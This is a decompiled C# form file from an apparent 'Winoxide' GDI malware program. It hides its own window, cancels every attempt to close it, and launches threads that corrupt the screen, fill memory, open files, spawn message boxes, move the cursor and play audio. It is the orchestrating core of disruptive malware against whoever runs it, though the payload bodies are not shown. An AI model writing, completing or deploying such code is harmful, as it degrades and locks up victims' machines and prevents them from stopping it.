using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace Winoxide;

public class Form1 : Form
{
	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
		Thread.Sleep(5000);
		new Thread(GDIxorfractalrainbowwithshakingscreen.glitch2).Start();
		new Thread(GDIxorfractalrainbowwithshakingscreen.glitches).Start();
		new Thread(GDIxorfractalrainbowwithshakingscreen.colors2).Start();
		new Thread(GDIxorfractalrainbowwithshakingscreen.clear).Start();
		new Thread(payloads.openfiles).Start();
		new Thread(payloads.memoryfiller).Start();
		new Thread(payloads.msgbox).Start();
		new Thread(payloads.movecursor).Start();
		new Thread(audio.Audio).Start();
		Thread.Sleep(32000);
		new Thread(GDIxorfractalrainbowwithshakingscreen.tearing).Start();
		new Thread(GDIxorfractalrainbowwithshakingscreen.flip).Start();
		new Thread(GDIxorfractalrainbowwithshakingscreen.blackout).Start();
		new Thread(audio2.Audio2).Start();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).AutoScaleDimensions = new SizeF(9f, 20f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Form)this).ClientSize = new Size(176, 288);
		((Control)this).Name = "Form1";
		((Form)this).Opacity = 0.0;
		((Form)this).ShowIcon = false;
		((Form)this).ShowInTaskbar = false;
		((Control)this).Text = ".";
		((Form)this).FormClosing += new FormClosingEventHandler(Form1_FormClosing);
		((Form)this).Load += Form1_Load;
		((Control)this).ResumeLayout(false);
	}
}
